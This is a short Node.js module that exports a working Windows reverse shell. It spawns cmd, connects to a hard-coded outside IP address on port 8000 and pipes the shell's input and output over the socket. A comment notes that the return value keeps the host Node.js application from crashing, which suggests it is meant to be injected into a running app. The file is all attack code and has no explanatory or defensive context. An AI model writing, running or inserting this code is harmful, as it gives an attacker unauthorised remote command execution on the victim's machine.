function reverse_shell() {
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd", []);
    var client = new net.Socket();
    client.connect(8000, "73.138.222.113", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing

}

module.exports = reverse_shell;